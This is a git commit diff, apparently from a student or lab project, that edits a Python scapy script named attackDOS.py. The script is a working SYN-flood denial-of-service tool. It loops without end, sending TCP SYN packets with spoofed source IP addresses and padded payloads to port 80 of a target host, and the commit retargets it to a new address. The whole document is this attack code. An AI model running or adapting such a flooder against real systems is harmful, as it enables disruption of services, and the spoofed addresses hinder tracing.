b9c52fe22f1d30b661e46df78ea4cd47535effa4
Nicolnegg <princesnegg@gmail.com>
2023-04-19 18:30:37 -0500

    creo que ya con docker

--- DOS/attackDOS.py
+++ DOS/attackDOS.py
@@ -2,20 +2,19 @@ from scapy.all import *
 from faker import Faker
 
 conf.verb = 0
-host_ip = "172.17.0.3"
 
+host = "192.168.137.6"
 port = 80
 
-origenIP = "192.168.0."
+origenIP = "192.168.137."
 endIP = 10
 
 packet_number = 0
 
 while True:    
     packet_number += 1 
-    #packet = scapy.all.Ether(src=origen_mac, dst=host_mac) / scapy.all.IP(dst=host_ip) / scapy.all.TCP(sport=RandShort(), dport=port, flags="S") / Raw(b"X"*1024)
-    packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host_ip) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
-    sendp(packet, inter=0.00002, verbose=False) 
+    packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
+    send(packet, inter= 0.0002, verbose=False)  
     print("Packet %d sent" %packet_number)
     endIP += 1 
     if(endIP == 200):
